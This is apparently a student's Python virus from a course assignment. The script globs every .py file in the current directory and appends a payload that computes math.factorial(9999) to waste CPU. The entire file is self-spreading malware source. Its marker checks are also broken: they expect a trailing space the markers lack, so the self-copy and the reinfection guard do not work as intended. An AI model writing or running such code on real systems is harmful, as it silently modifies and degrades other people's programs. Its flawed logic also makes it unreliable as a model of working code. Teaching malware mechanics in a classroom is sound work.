# Ryan Scott
# ITT-305


import glob
import re
import sys

# START VIRUS
# you can't handle this!

# Duplication Time!
virusCode = ["\n# you can't handle this!\nimport math\nmath.factorial(9999)\n# Run if you dare!\n"]
thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()

# Inject Virus Payload
inVirus = False
for line in lines:
    if (re.search('^# START VIRUS ', line)):
        inVirus = True

    if (inVirus):
        virusCode.append(line)

    if (re.search('^# END VIRUS ', line)):
        break

# Gather all python files
programs = glob.glob("*.py")

for p in programs:
    file = open(p, "r")
    programCode = file.readlines()
    file.close()

    infected = False

    # Don't endlessly inject virus!
    for line in programCode:
        if ('# START VIRUS ' in line):
            infected = True
            break

    # Inject virus if not infected!
    if not infected:
        newCode = []
        newCode.extend(programCode)
        newCode.extend(virusCode)

        file = open(p, "w")
        file.writelines(newCode)
        file.close()

print(f"Virus successfully infected {p}!")

# END VIRUS
